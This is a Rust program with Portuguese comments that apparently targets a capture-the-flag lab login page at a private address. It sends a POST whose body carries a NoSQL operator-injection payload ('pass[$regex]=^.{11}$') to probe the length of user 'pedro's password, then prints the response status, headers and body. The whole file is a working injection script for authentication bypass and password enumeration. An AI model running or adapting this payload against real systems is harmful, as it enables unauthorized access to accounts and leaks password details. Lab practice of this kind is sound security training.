use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, HeaderValue};

fn main() {
    // Construir cabeçalhos idênticos
    let mut headers = HeaderMap::new();
    headers.insert("Host", HeaderValue::from_static("10.10.136.145"));
    headers.insert("Cache-Control", HeaderValue::from_static("max-age=0"));
    headers.insert("Origin", HeaderValue::from_static("http://10.10.136.145"));
    headers.insert(
        "Content-Type",
        HeaderValue::from_static("application/x-www-form-urlencoded"),
    );
    headers.insert("Upgrade-Insecure-Requests", HeaderValue::from_static("1"));
    headers.insert("User-Agent", HeaderValue::from_static("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"));
    headers.insert("Accept", HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"));
    headers.insert("Sec-GPC", HeaderValue::from_static("1"));
    headers.insert(
        "Accept-Language",
        HeaderValue::from_static("en-US,en;q=0.5"),
    );
    headers.insert(
        "Referer",
        HeaderValue::from_static("http://10.10.136.145/?err=1"),
    );
    headers.insert("Accept-Encoding", HeaderValue::from_static("gzip, deflate"));

    // Corpo da requisição
    let payload = "user=pedro&pass[$regex]=^.{11}$&remember=on";

    // Criar cliente com configuração personalizada para desatiar redirecionamento automático
    let client = Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .expect("Falha ao construir cliente HTTP");

    // Fazer a requisição POST exatamente para o endpoint correto
    let response = client
        .post("http://10.10.136.145/login.php")
        .headers(headers)
        .body(payload)
        .send()
        .expect("Falha na requisição");

    // Exibit informações detalhadas da resposta
    println!(
        "Status: {} {}",
        response.status().as_u16(),
        response.status().canonical_reason().unwrap()
    );

    println!("{:?}", response);

    println!("\n--- Headers da resposta ---");
    for (name, value) in response.headers() {
        println!("{}: {}", name, value.to_str().unwrap_or("[valor binário"));
    }

    // Mostrar URL da requisição para verificação
    println!("\nURL requisitada: {}", response.url());

    // Veificar o corpo da resposta apra debug
    match response.text() {
        Ok(body) => {
            if body.len() > 100 {
                println!(
                    "\nCorpo da resposta (primeiros 100 caracteres):\n{}",
                    &body[..100]
                );
            } else if !body.is_empty() {
                println!("\nCorpo da resposta:\n{}", body);
            } else {
                println!("\nCorpo da resposta vazio");
            }
        }
        Err(e) => println!("Erro ao ler corpo: {}", e),
    }
}
